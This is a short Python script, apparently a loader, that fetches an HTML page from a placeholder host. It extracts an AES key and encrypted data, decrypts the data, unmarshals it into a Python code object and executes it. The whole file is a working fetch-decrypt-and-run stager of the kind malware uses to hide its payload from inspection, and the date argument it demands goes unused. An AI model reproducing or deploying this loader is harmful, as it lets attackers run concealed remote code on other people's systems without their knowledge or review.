import sys  
import requests  
from bs4 import BeautifulSoup  
from Crypto.Cipher import AES  
from Crypto.Util.Padding import pad, unpad  
from base64 import b64decode  
import marshal  
import types  
import io  
    
if len(sys.argv) != 2:  
    print("Usage: python decrypt_and_execute.py <date>")  
    sys.exit(1)  
  
date_param = sys.argv[1]  
html_url = 'http://example.com/encrypted_data.html'  
  
response = requests.get(html_url)  
response.raise_for_status() 
html_content = response.text  

soup = BeautifulSoup(html_content, 'html.parser')  
aes_key_tag = soup.find('div', {'id': 'aes-key'})  
aes_key = aes_key_tag.text.strip() if aes_key_tag else None  
encrypted_code_tag = soup.find('div', {'id': 'encrypted-code'})  
encrypted_code = encrypted_code_tag.text.strip() if encrypted_code_tag else None  

if not aes_key or not encrypted_code:  
    print("AES key or encrypted code not found in the HTML.")  
    sys.exit(1)  
   
aes_key_bytes = b64decode(aes_key)  
  
iv = b'\x00' * 16  
cipher = AES.new(aes_key_bytes, AES.MODE_CBC, iv)  
decrypted_bytes = unpad(cipher.decrypt(b64decode(encrypted_code)), AES.block_size)  
code_object = marshal.loads(decrypted_bytes)  
exec_func = types.FunctionType(code_object, globals())  
exec_func()  
